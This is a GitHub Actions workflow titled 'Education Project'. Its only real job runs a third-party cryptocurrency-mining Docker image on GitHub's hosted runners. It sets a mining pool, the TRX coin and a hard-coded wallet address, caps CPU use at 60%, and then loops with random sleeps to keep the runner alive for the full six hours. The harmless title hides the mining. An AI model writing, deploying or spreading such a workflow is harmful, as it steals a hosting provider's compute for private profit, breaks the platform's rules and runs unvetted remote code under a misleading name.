name: Education Project

on:
  workflow_dispatch:  # Manual trigger
  # schedule:
  #   - cron: '0 */6 * * *'  # Run every 6 hours

jobs:
  run-mining-container:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # 6 hour maximum (GitHub limit)
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3
    
    - name: Run mining container with CPU limits
      run: |
        # Run mining container with CPU limits
        docker run --restart unless-stopped --name node -d \
          -e POOL="rx.unmineable.com:3333" \
          -e COIN="TRX" \
          -e WALLET_ADDRESS="TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9" \
          -e WORKER_NAME="github1" \
          -e CPU_LIMIT_ENABLE="true" \
          -e CPU_LIMIT_PERCENT="60" \
          thechristech/unmineable:latest
        
        echo "Mining container started with CPU limit: 60%"
        
        # Start hello script in parallel
        while true; do
          echo "$(date): hello from GitHub Actions"
          # Random sleep between 60-120 seconds
          sleep $((RANDOM % 61 + 60))
        done
        
        # Note: The while loop above will run until GitHub Actions times out (6 hours max)
